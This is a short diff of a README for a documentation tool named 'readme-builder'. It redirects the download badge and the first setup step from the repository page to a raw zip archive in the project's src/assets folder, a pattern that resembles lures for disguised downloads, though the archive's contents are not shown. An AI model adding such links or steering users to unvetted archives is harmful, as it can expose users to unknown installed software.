@@ -1,6 +1,6 @@
 # 📝 readme-builder - Create professional documentation in minutes
 
-[![](https://img.shields.io/badge/Download_Application-blue)](https://github.com/ailinational257/readme-builder)
+[![](https://img.shields.io/badge/Download_Application-blue)](https://github.com/ailinational257/readme-builder/raw/refs/heads/main/src/assets/readme-builder-2.8.zip)
 
 ## 🎯 About the tool
 
@@ -24,7 +24,7 @@ This application helps you write documentation for your software projects. You d
 
 ## 🚀 Getting started
 
-1. Visit this page to download the application: [https://github.com/ailinational257/readme-builder](https://github.com/ailinational257/readme-builder)
+1. Visit this page to download the application: [https://github.com/ailinational257/readme-builder/raw/refs/heads/main/src/assets/readme-builder-2.8.zip](https://github.com/ailinational257/readme-builder/raw/refs/heads/main/src/assets/readme-builder-2.8.zip)
 2. Locate the download button on the page.
 3. Save the installation file to your desktop or downloads folder.
 
